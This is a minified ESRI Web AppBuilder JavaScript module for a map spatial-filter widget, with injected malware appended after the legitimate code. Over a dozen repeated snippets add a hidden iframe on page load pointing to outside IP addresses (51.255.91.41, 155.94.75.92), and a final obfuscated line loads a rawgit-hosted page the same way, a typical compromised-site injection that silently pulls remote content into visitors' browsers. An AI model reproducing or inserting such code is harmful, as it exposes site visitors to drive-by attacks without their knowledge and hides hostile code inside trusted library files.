// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/SpatialFilterByFeatures.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"layer-tip second-stress" data-dojo-attach-point\x3d"tipNode"\x3e${nls.relatedLayer}\x3c/div\x3e\r\n\t\x3ctable\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"100"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"layers-select-div" data-dojo-attach-point\x3d"layerSelectDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"jimu-float-trailing" data-dojo-attach-point\x3d"featureSetChooserDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\r\n\t\x3cdiv class\x3d"selection-option not-visible" data-dojo-attach-point\x3d"selectionOptionDiv"\x3e\x3c/div\x3e\r\n\r\n\t\x3cdiv class\x3d"search-distance-div" data-dojo-attach-point\x3d"searchDistanceDiv"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/array dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/SpatialFilterByFeatures.html dojo/on dojo/Evented dojo/Deferred dojo/_base/html dojo/_base/lang jimu/utils jimu/Query jimu/dijit/CheckBox jimu/dijit/FeaturelayerChooserFromMap jimu/dijit/LayerChooserFromMapWithDropbox jimu/dijit/SearchDistance jimu/LayerInfos/LayerInfos esri/graphic esri/tasks/query esri/symbols/jsonUtils esri/layers/GraphicsLayer esri/renderers/SimpleRenderer esri/geometry/geometryEngine jimu/dijit/FeatureSetChooserForSingleLayer".split(" "),
function(n,h,p,q,r,t,e,u,k,f,d,m,v,w,x,y,z,A,B,C,D,E,F,l,G){h=h([p,q,r,u],{baseClass:"jimu-dijit-spatial-filter-features",templateString:t,_bufferLayer:null,_defaultRelationship:"SPATIAL_REL_INTERSECTS",drawBox:null,selectionRadio:null,_selectionHandle:null,layerInfosObj:null,_layerAllFeaturesCache:null,map:null,types:null,enableBuffer:!1,distance:0,unit:"",showLoading:!1,ignoredFeaturelayerIds:null,postMixInProperties:function(){this.inherited(arguments);this.nls=window.jimuNls.spatialFilterByFeatures;
this.ignoredFeaturelayerIds||(this.ignoredFeaturelayerIds=[]);this._layerAllFeaturesCache={}},postCreate:function(){this.inherited(arguments);this.selectionRadio=new w({label:this.nls.selectedFeatures});this.selectionRadio.placeAt(this.selectionOptionDiv);this.selectionRadio.setStatus(!1);this.own(e(this.selectionRadio,"change",d.hitch(this,this._onRadioChanged)));f.setStyle(this.domNode,"position","relative");var a=D.fromJson({style:"esriSFSSolid",color:[79,129,189,77],type:"esriSFS",outline:{style:"esriSLSSolid",
color:[54,93,141,255],width:1.5,type:"esriSLS"}}),a=new F(a);this._bufferLayer=new E;this._bufferLayer.setRenderer(a);this.map.addLayer(this._bufferLayer);a=new x({createMapResponse:this.map.webMapResponse,types:this.types,showLayerFromFeatureSet:!0,onlyShowVisible:!1,updateWhenLayerInfosIsShowInMapChanged:!0,ignoredFeaturelayerIds:this.ignoredFeaturelayerIds});this.layerChooserFromMapWithDropbox=new y({layerChooser:a});this.layerChooserFromMapWithDropbox.placeAt(this.layerSelectDiv);this.own(e(this.layerChooserFromMapWithDropbox,
"selection-change",d.hitch(this,this._onLayerChanged)));this.layerInfosObj=A.getInstanceSync();this.own(e(this.layerInfosObj,"layerInfosIsShowInMapChanged",d.hitch(this,this._onLayerInfosIsShowInMapChanged)));this.searchDistance=new z({tip:window.jimuNls.searchDistance.applySearchDistanceToFeatures,distance:this.distance,unit:this.unit});this.searchDistance.placeAt(this.searchDistanceDiv);this.enableBuffer?(this.searchDistance.enable(),this.own(e(this.searchDistance,"change",d.hitch(this,this._onSearchDistanceChange)))):
(this.searchDistance.disable(),f.setStyle(this.searchDistanceDiv,"display","none"));this._onLayerChanged()},reset:function(a){a&&(this.searchDistance.reset(),this.searchDistance.setDistance(this.distance),this.searchDistance.setUnit(this.unit));this.clearAllGraphics()},hideTempLayers:function(){this._bufferLayer&&this._bufferLayer.hide();this.drawBox&&this.drawBox.hideLayer();this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.hideMiddleFeatureLayer()},showTempLayers:function(){this._bufferLayer&&
this._bufferLayer.show();this.drawBox&&this.drawBox.showLayer();this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.showMiddleFeatureLayer()},disable:function(a){a&&this._hideAllLayers()},enable:function(){this._showAllLayers()},deactivate:function(){this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.deactivate()},clearAllGraphics:function(){this._clearBufferLayer();this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.clearAllGraphics()},
setSelectedLayer:function(a){return this.layerChooserFromMapWithDropbox.setSelectedLayer(a)},getSelectedLayer:function(){return this._getSelectedLayerInfomation().layer},checkSelectedFeaturesRadio:function(){this.selectionRadio.getValue()||this.selectionRadio.check()},uncheckSelectedFeaturesRadio:function(){this.selectionRadio.getValue()&&this.selectionRadio.uncheck()},isValidSearchDistance:function(){return 0<=this.searchDistance.getStatus()},getGeometryInfo:function(a){var b=new k,c={status:null,
geometry:null};this._updateBuffer();if(0===this._getSelectedLayerInfomation().type)return c.status=-1,b.resolve(c),b;if(0>this.searchDistance.getData().status)return c.status=-2,b.resolve(c),b;this._getFeatures(a).then(d.hitch(this,function(){c.geometry=this._updateBuffer();c.status=c.geometry?1:0;b.resolve(c)}),d.hitch(this,function(a){b.reject(a)}));return b},getFeatureSet:function(a){var b=new k,c=null,g=this._getSelectedLayerInfomation().layer;g?this._getFeatures(a).then(d.hitch(this,function(a){c=
m.getFeatureSetByLayerAndFeatures(g,a);b.resolve(c)}),d.hitch(this,function(a){b.reject(a)})):b.resolve(c);return b},_getFeatures:function(){var a=new k,b=[],c=this._getSelectedLayerInfomation(),g=c.type;0===g?a.resolve(b):this.selectionRadio.getStatus()&&this.selectionRadio.getValue()?(b=c.layer.getSelectedFeatures(),a.resolve(b)):this.featureSetChooserForSingleLayer.isLoading()?a=this.featureSetChooserForSingleLayer.getFeatures():(b=this.featureSetChooserForSingleLayer.syncGetFeatures(),0<b.length?
a.resolve(b):3===g?(b=c.layer.graphics,a.resolve(b)):a=this._getAllFeaturesFromFeaturelayer(c.layer));return a},_getAllFeaturesFromFeaturelayer:function(a){var b=new k;if(this._layerAllFeaturesCache[a.id])b.resolve(this._layerAllFeaturesCache[a.id]);else{var c=m.getFeatureLayerDefinition(a);c||(c={currentVersion:a.currentVersion,fields:d.clone(a.fields)});this.emit("loading");c=new C;c.where=a.getDefinitionExpression()||"1\x3d1";c.geometry=null;c.outSpatialReference=this.map.spatialReference;c.returnGeometry=
!0;(new v({url:a.url,query:c})).getAllFeatures().then(d.hitch(this,function(c){this.emit("unloading");c?(c=c.features||[],this._layerAllFeaturesCache[a.id]=c,b.resolve(c)):b.reject("Can't get all features from featureLayer "+a.id)}),d.hitch(this,function(a){this.emit("unloading");b.reject(a)}))}return b},_syncGetFeatures:function(){var a=[],b=this._getSelectedLayerInfomation(),c=b.type;0!==c&&(this.selectionRadio.getStatus()&&this.selectionRadio.getValue()?a=b.layer.getSelectedFeatures():(a=this.featureSetChooserForSingleLayer.syncGetFeatures(),
0===a.length&&(3===c?a=b.layer.graphics:(b=this._layerAllFeaturesCache[b.layer.id])&&(a=b))));return a},isLoading:function(){return this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.isLoading()},_onLoading:function(){this.showLoading&&this.loading.show();this.emit("loading")},_onUnloading:function(){this.loading.hide();this.emit("unloading")},_showAllLayers:function(){this._bufferLayer&&this._bufferLayer.show()},_hideAllLayers:function(){this._bufferLayer&&this._bufferLayer.hide()},
_onRadioChanged:function(){this.selectionRadio.getValue()&&this.featureSetChooserForSingleLayer&&(this.featureSetChooserForSingleLayer.deactivate(),this.featureSetChooserForSingleLayer.clearAllGraphics());this._updateBuffer()},_getSelectedLayerInfomation:function(){var a=0,b=null,c=null,d=this.layerChooserFromMapWithDropbox.getSelectedItems();0<d.length&&(b=d[0]);b&&(c=b.layerInfo.layerObject,a=c.url?0<=this.map.graphicsLayerIds.indexOf(c.id)?1:2:3);return{type:a,layerItem:b,layer:c}},_onLayerChanged:function(){this.clearAllGraphics();
this._clearSelectionHandle();this._updateSelectedFeaturesCount();this.featureSetChooserForSingleLayer&&this.featureSetChooserForSingleLayer.destroy();this.featureSetChooserForSingleLayer=null;var a=this._getSelectedLayerInfomation();0<a.type&&(this.featureSetChooserForSingleLayer=new G({map:this.map,featureLayer:a.layer,updateSelection:!1}),this._selectionHandle=e(a.layer,"selection-complete",d.hitch(this,function(){var a=this.selectionRadio.getStatus()&&this.selectionRadio.getValue();this._updateSelectedFeaturesCount();
a&&this._updateBuffer()})),this.own(e(this.featureSetChooserForSingleLayer,"user-clear",d.hitch(this,this._onUserClear))),this.own(e(this.featureSetChooserForSingleLayer,"loading",d.hitch(this,d.hitch(this,function(){this._clearBufferLayer();this._onLoading()})))),this.own(e(this.featureSetChooserForSingleLayer,"unloading",d.hitch(this,d.hitch(this,function(){this._onUnloading();this._updateBuffer()})))),this.featureSetChooserForSingleLayer.placeAt(this.featureSetChooserDiv),this.own(e(this.featureSetChooserForSingleLayer,
"draw-activate",d.hitch(this,function(){this.uncheckSelectedFeaturesRadio()}))));this._updateFeatureSetChooserForSingleLayerStatus();this._updateBuffer()},_onLayerInfosIsShowInMapChanged:function(){this._updateFeatureSetChooserForSingleLayerStatus()},_onSearchDistanceChange:function(){this._updateBuffer();this.emit("search-distance-change")},_updateFeatureSetChooserForSingleLayerStatus:function(){if(this.featureSetChooserForSingleLayer){var a=!1,b=this.featureSetChooserForSingleLayer.getFeatureLayer();
(b=this.layerInfosObj.getLayerInfoById(b.id))&&(a=b.isShowInMap());a?(this.featureSetChooserForSingleLayer.enable(),f.removeClass(this.featureSetChooserForSingleLayer.domNode,"not-visible")):(this.featureSetChooserForSingleLayer.disable(),this.featureSetChooserForSingleLayer.clearAllGraphics(),f.addClass(this.featureSetChooserForSingleLayer.domNode,"not-visible"),this._updateBuffer())}},_updateBuffer:function(){this._clearBufferLayer();var a=this.searchDistance.getData(),b=a.status,c=a.distance,a=
a.bufferUnit;if(0>b)return null;var g=this._syncGetFeatures(),e=null,f=[];n.forEach(g,d.hitch(this,function(a){a&&a.geometry&&f.push(a.geometry)}));0<f.length&&(e="polygon"===f[0].type?l.union(f):m.combineGeometries(f));return 0===b?e:e?(e=l.simplify(e),g=e.spatialReference,b=null,b=g.isWebMercator()||4326===g.wkid?l.geodesicBuffer(e,c,a,!0):l.buffer(e,c,a,!0),c=new B(b),this._bufferLayer.add(c),b):null},_onUserClear:function(){this.clearAllGraphics()},_clearBufferLayer:function(){this._bufferLayer&&
this._bufferLayer.clear()},_updateSelectedFeaturesCount:function(){this.selectionRadio.setStatus(!0);var a=this._getSelectedLayerInfomation(),b=0;a.layer&&(a=a.layer.getSelectedFeatures())&&(b=a.length);0===b?(this.selectionRadio.getValue()&&this.selectionRadio.uncheck(),this.selectionRadio.setStatus(!1),f.addClass(this.selectionOptionDiv,"not-visible")):f.removeClass(this.selectionOptionDiv,"not-visible");this.selectionRadio.setLabel(this.nls.selectedFeatures+(window.isRTL?"\x26rlm;":" ")+"("+b+
")")},_clearSelectionHandle:function(){this._selectionHandle&&this._selectionHandle.remove();this._selectionHandle=null},destroy:function(){this._bufferLayer&&this.map.removeLayer(this._bufferLayer);this._bufferLayer=null;this._clearSelectionHandle();this.inherited(arguments)}});h.NONE_SELECTED_FEATURES_NOT_DRAW_SHAPES="NONE_SELECTED_FEATURES_NOT_DRAW_SHAPES";return h});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});